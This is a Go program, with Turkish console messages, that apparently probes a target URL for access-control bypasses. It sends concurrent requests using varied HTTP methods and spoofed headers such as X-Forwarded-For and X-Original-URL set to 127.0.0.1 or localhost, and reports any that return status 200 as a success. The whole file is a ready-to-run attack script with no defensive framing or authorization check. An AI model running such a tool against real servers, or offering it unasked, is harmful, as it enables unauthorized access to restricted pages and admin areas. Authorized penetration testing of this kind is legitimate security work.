package main

import (
	"fmt"
	"net/http"
	"os"
	"sync"
)

var headers = []string{
	"X-Forwarded-For",
	"X-Forwarded-Host",
	"X-Custom-IP-Authorization",
	"X-Original-URL",
	"X-Rewrite-URL",
	"X-Remote-IP",
	"X-Remote-Addr",
}

var payloads = []string{"127.0.0.1", "localhost", "0.0.0.0"}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Kullanım: go run main.go <url>")
		return
	}

	targetURL := os.Args[1]
	var wg sync.WaitGroup

	fmt.Printf("[*] Hedef: %s için bypass denemeleri başlatılıyor...\n", targetURL)

	methods := []string{"GET", "POST", "PUT", "TRACE", "OPTIONS", "PATCH"}
	for _, method := range methods {
		wg.Add(1)
		go func(m string) {
			defer wg.Done()
			sendRequest(m, targetURL, nil)
		}(method)
	}

	for _, h := range headers {
		for _, p := range payloads {
			wg.Add(1)
			go func(header, payload string) {
				defer wg.Done()
				customHeaders := map[string]string{header: payload}
				sendRequest("GET", targetURL, customHeaders)
			}(h, p)
		}
	}

	wg.Wait()
	fmt.Println("[+] Tarama tamamlandı.")
}

func sendRequest(method, url string, customHeaders map[string]string) {
	client := &http.Client{}
	req, _ := http.NewRequest(method, url, nil)

	for k, v := range customHeaders {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		fmt.Printf("[SUCCESS] Method: %s | Headers: %v | Status: %d\n", method, customHeaders, resp.StatusCode)
	}
}
